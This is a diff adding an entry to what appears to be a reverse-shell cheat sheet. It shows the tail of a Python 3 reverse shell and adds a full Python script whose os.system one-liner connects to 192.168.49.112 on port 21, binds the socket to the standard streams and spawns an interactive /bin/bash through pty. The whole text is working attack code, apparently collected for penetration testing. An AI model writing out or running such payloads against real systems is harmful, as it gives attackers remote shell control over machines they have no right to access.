@@ -73,3 +73,15 @@ python3(file)
  dup2(s.fileno(),2) 
  run(["/bin/bash","-i"])
 ```
+
+python(file)
+```
+#!/usr/bin/env python
+import os
+import sys
+try: 
+        os.system("python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.112\",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'") 
+except: 
+        print 'ERROR...' 
+sys.exit(0) 
+```
